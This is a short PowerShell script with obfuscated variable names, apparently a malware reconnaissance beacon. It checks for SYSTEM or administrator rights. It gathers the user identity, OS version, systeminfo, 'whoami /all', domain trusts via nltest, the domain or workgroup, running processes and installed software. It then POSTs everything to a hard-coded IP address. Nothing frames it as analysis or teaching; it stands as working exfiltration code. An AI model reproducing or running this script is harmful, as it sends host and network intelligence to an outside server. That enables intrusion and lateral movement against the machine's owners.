$VRNdfHZuQV="http://159.65.42.223/c/414E7993B94A9867"
$ZbXntfwbhb = $xSDLKJVMkr;
$bsbOSqZuAn = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User.Value
$CnGTfIytRz = "S-1-5-18"

if ($bsbOSqZuAn -eq $CnGTfIytRz) {
    $ZbXntfwbhb = $gyZCzWxLjt
} else {
    $ZbXntfwbhb = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
}

$mvFRdGsrxD = $(whoami)
if ($ZbXntfwbhb){$mvFRdGsrxD = $mvFRdGsrxD + '(admin)'}
$KtwdjmJxyK = 'Windows ' + [string]$([System.Environment]::OSVersion.Version.Major)
$WWdbTIXuHw = ($(systeminfo)|out-string)
$WWdbTIXuHw += ($(whoami /all)|out-string)
$WWdbTIXuHw += ($(nltest /domain_trusts)|out-string)
$lfNORgXVVk = (Get-WmiObject -Class Win32_ComputerSystem).PartOfDomain
if($lfNORgXVVk){$dhNgSaZyJB = (Get-WmiObject -Class Win32_ComputerSystem).Domain}
else{$dhNgSaZyJB = (Get-WmiObject -Class Win32_ComputerSystem).Workgroup}
$HkNarMRMhX = ($(tasklist)|out-string)
$syASpBQCrn = (Get-WmiObject -Class Win32_Product|Out-String)
$OJuJzAllOu = @{
  os = $KtwdjmJxyK
  user = $mvFRdGsrxD
  systeminfo = $WWdbTIXuHw
  domain = $dhNgSaZyJB
  ps = $HkNarMRMhX
  software = $syASpBQCrn
}
Invoke-RestMethod -Method Post -Uri $VRNdfHZuQV -Body $OJuJzAllOu
